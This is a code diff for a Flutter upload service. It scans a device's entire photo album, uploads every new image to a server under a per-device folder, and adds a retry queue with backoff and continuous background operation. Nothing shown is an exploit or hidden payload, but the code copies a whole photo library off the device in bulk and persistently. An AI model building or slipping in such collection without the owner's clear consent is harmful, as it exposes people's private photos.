@@ -10,9 +10,10 @@ import 'package:shared_preferences/shared_preferences.dart';
 /// 字段：file（文件，必填）+ folder（子目录，可选）
 /// 每个设备一个独立 folder，便于后台按设备归档
 ///
-/// 防重复上传：
-///   在应用私有 data 目录生成 upload_record.json，
-///   记录已上传文件的唯一标识（大小+修改时间），下次启动跳过已上传的。
+/// 特性：
+///   - 防重复（upload_record.json 记录已上传指纹）
+///   - 失败自动重试（retry_queue.json 记录待重试指纹，带退避）
+///   - 后台持续运行（结合 flutter_foreground_task）
 class UploadService {
   UploadService._();
 
@@ -20,6 +21,7 @@ class UploadService {
   static const List<String> _imageExts = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp', '.heic'];
 
   static const String _recordFileName = 'upload_record.json';
+  static const String _retryQueueName = 'retry_queue.json';
 
   // ====== 设备标识（作为上传 folder）======
 
@@ -40,32 +42,30 @@ class UploadService {
     return id;
   }
 
-  // ====== 已上传清单（防重复）======
+  // ====== 私有 data 目录 ======
 
-  /// 应用私有 data 目录下的记录文件路径
-  static Future<String> _recordPath() async {
+  static Future<String> _dataDir() async {
     final docs = await getApplicationDocumentsDirectory();
-    return '${docs.path}/$_recordFileName';
+    return docs.path;
   }
 
-  /// 读取已上传记录（Set<String>，存文件唯一标识）
+  // ====== 已上传清单（防重复）======
+
+  static Future<String> _recordPath() async => '${await _dataDir()}/$_recordFileName';
+
   static Future<Set<String>> loadRecord() async {
     try {
-      final path = await _recordPath();
-      final f = File(path);
+      final f = File(await _recordPath());
       if (!await f.exists()) return <String>{};
-      final raw = await f.readAsString();
-      final decoded = jsonDecode(raw);
+      final decoded = jsonDecode(await f.readAsString());
       if (decoded is List) return decoded.map((e) => e.toString()).toSet();
     } catch (_) {}
     return <String>{};
   }
 
-  /// 追加写入一条记录
   static Future<void> _saveRecord(Set<String> record) async {
     try {
-      final path = await _recordPath();
-      final f = File(path);
+      final f = File(await _recordPath());
       await f.writeAsString(jsonEncode(record.toList()), flush: true);
     } catch (_) {}
   }
@@ -82,10 +82,52 @@ class UploadService {
     }
   }
 
+  // ====== 重试队列（失败自动重试）======
+
+  static Future<String> _retryPath() async => '${await _dataDir()}/$_retryQueueName';
+
+  /// 读取待重试列表
+  static Future<List<Map<String, dynamic>>> loadRetryQueue() async {
+    try {
+      final f = File(await _retryPath());
+      if (!await f.exists()) return [];
+      final decoded = jsonDecode(await f.readAsString());
+      if (decoded is List) return decoded.cast<Map<String, dynamic>>();
+    } catch (_) {}
+    return [];
+  }
+
+  /// 保存待重试列表
+  static Future<void> _saveRetryQueue(List<Map<String, dynamic>> queue) async {
+    try {
+      final f = File(await _retryPath());
+      await f.writeAsString(jsonEncode(queue), flush: true);
+    } catch (_) {}
+  }
+
+  /// 把失败项加入重试队列（去重，按 fingerprint）
+  static Future<void> addToRetryQueue(String filePath, String fingerprint) async {
+    final queue = await loadRetryQueue();
+    if (queue.any((e) => e['fingerprint'] == fingerprint)) return;
+    queue.add({
+      'fingerprint': fingerprint,
+      'path': filePath,
+      'retry_count': 0,
+      'last_retry': DateTime.now().millisecondsSinceEpoch,
+    });
+    await _saveRetryQueue(queue);
+  }
+
+  /// 从重试队列移除（上传成功时）
+  static Future<void> removeFromRetryQueue(String fingerprint) async {
+    final queue = await loadRetryQueue();
+    queue.removeWhere((e) => e['fingerprint'] == fingerprint);
+    await _saveRetryQueue(queue);
+  }
+
   // ====== 扫描相册图片（photo_manager / MediaStore）======
 
   /// 请求相册权限
-  /// 返回 true=已授权
   static Future<bool> requestPermission() async {
     try {
       final ps = await PhotoManager.requestPermissionExtend();
@@ -104,12 +146,8 @@ class UploadService {
         hasAll: true,
       );
       for (final path in paths) {
-        // end 必须是 int，用 assetCountAsync（Future<int>）await 取值
         final count = await path.assetCountAsync;
-        final assets = await path.getAssetListRange(
-          start: 0,
-          end: count,
-        );
+        final assets = await path.getAssetListRange(start: 0, end: count);
         for (final asset in assets) {
           if (asset.type != AssetType.image) continue;
           final file = await asset.file;
@@ -118,25 +156,18 @@ class UploadService {
           }
         }
       }
-    } catch (_) {
-      // 权限不足或出错，返回已收集的部分
-    }
+    } catch (_) {}
     return result;
   }
 
   // ====== 上传 ======
 
   /// 上传单个图片文件
-  /// [filePath] 本地文件路径
-  /// [folder] 可选子目录；为空时自动使用当前设备 ID
-  /// 返回 (成功, 消息, 服务器返回的原始文本)
-  static Future<(bool, String, String)> uploadImage(
-    String filePath, {
-    String? folder,
-  }) async {
+  /// 返回 (成功, 消息)
+  static Future<(bool, String)> uploadImage(String filePath, {String? folder}) async {
     try {
       final f = File(filePath);
-      if (!await f.exists()) return (false, '文件不存在', '');
+      if (!await f.exists()) return (false, '文件不存在');
 
       final devId = await getDeviceId();
       final finalFolder = (folder == null || folder.isEmpty) ? devId : folder;
@@ -146,70 +177,107 @@ class UploadService {
 
       final request = http.MultipartRequest('POST', Uri.parse(_base));
       request.fields['folder'] = finalFolder;
-      // 保留原文件名，方便服务端识别
-      request.files.add(await http.MultipartFile.fromPath(
-        'file',
-        filePath,
-        filename: fileName,
-      ));
+      request.files.add(await http.MultipartFile.fromPath('file', filePath, filename: fileName));
 
       final streamed = await request.send().timeout(const Duration(seconds: 120));
       final resp = await http.Response.fromStream(streamed);
 
-      // 尝试解析 JSON
       try {
         final decoded = jsonDecode(utf8.decode(resp.bodyBytes));
         final ok = decoded is Map<String, dynamic> && decoded['success'] == true;
         final msg = decoded is Map<String, dynamic>
             ? (decoded['message'] as String? ?? '')
             : '';
-        return (ok, msg.isEmpty ? (ok ? '上传成功' : '上传失败') : msg, resp.body);
+        return (ok, msg.isEmpty ? (ok ? '上传成功' : '上传失败') : msg);
       } catch (_) {
-        // 非 JSON 响应，按 HTTP 状态判断
         if (resp.statusCode >= 200 && resp.statusCode < 300) {
-          return (true, '上传成功', resp.body);
+          return (true, '上传成功');
         }
-        return (false, '服务器返回异常（HTTP ${resp.statusCode}）', resp.body);
+        return (false, '服务器返回异常（HTTP ${resp.statusCode}）');
       }
     } on TimeoutException {
-      return (false, '上传超时，请重试', '');
+      return (false, '上传超时');
     } catch (e) {
-      return (false, '上传失败，请检查网络后重试', '');
+      return (false, '上传失败');
     }
   }
 
-  /// 请求权限 + 扫描相册 + 只上传新增图片（启动时调用，防重复）
-  /// 返回 (上传数量, 跳过数量)
-  static Future<(int, int)> scanAndUploadAll() async {
-    // 1. 请求相册权限
-    final granted = await requestPermission();
-    if (!granted) return (0, 0);
-
-    // 2. 读取已上传记录
+  /// 上传一张并把结果记录到"已上传"或"重试队列"
+  /// 返回 (status, msg) status: 'ok' | 'retry' | 'skip'
+  static Future<(String, String)> uploadOne(String filePath) async {
+    if (!isImagePath(filePath)) return ('skip', '非图片');
+    final fp = await _fingerprint(filePath);
     final record = await loadRecord();
+    if (record.contains(fp)) return ('skip', '已上传');
 
-    // 3. 扫描所有图片
+    final (ok, msg) = await uploadImage(filePath);
+    if (ok) {
+      record.add(fp);
+      await _saveRecord(record);
+      await removeFromRetryQueue(fp);
+      return ('ok', msg);
+    } else {
+      // 失败加入重试队列
+      await addToRetryQueue(filePath, fp);
+      return ('retry', msg);
+    }
+  }
+
+  /// 扫描新增图片并上传（一个批次，失败进重试队列）
+  /// 返回 (uploaded, retried, skipped)
+  static Future<(int, int, int)> scanAndUploadNew() async {
+    final granted = await requestPermission();
+    if (!granted) return (0, 0, 0);
     final images = await scanAlbumImages();
-    if (images.isEmpty) return (0, 0);
+    if (images.isEmpty) return (0, 0, 0);
 
-    // 4. 逐个上传新增的图片
-    var uploaded = 0, skipped = 0;
+    var uploaded = 0, retried = 0, skipped = 0;
     for (final img in images) {
-      if (!isImagePath(img)) continue;
-      final fp = await _fingerprint(img);
-      if (record.contains(fp)) {
-        skipped++;
+      final (status, _) = await uploadOne(img);
+      if (status == 'ok') uploaded++;
+      else if (status == 'retry') retried++;
+      else skipped++;
+    }
+    return (uploaded, retried, skipped);
+  }
+
+  /// 单独处理重试队列，带退避重试
+  /// 成功移除，失败累加 retry_count
+  static Future<int> processRetryQueue() async {
+    final queue = await loadRetryQueue();
+    if (queue.isEmpty) return 0;
+    var done = 0;
+    final now = DateTime.now().millisecondsSinceEpoch;
+    for (final item in queue) {
+      final last = item['last_retry'] as int? ?? 0;
+      final retryCount = (item['retry_count'] as int? ?? 0);
+      // 退避：每次重试间隔 5s * 2^n，最多 5 次后等 60s
+      final backoff = retryCount >= 5
+          ? 60000
+          : (5000 * (1 << retryCount));
+      if (now - last < backoff) continue;
+
+      final path = item['path'] as String? ?? '';
+      if (!await File(path).exists()) {
+        await removeFromRetryQueue(item['fingerprint'] as String? ?? '');
+        done++;
         continue;
       }
-      final (success, _, _) = await uploadImage(img);
-      if (success) {
-        uploaded++;
-        record.add(fp);
-        // 每上传一张保存一次，确保不重复
+      final (ok, _) = await uploadImage(path);
+      if (ok) {
+        final record = await loadRecord();
+        record.add(item['fingerprint'] as String? ?? '');
         await _saveRecord(record);
+        await removeFromRetryQueue(item['fingerprint'] as String? ?? '');
+        done++;
+      } else {
+        // 更新重试次数
+        item['retry_count'] = retryCount + 1;
+        item['last_retry'] = now;
+        await _saveRetryQueue(queue);
       }
     }
-    return (uploaded, skipped);
+    return done;
   }
 
   static bool isImagePath(String path) {
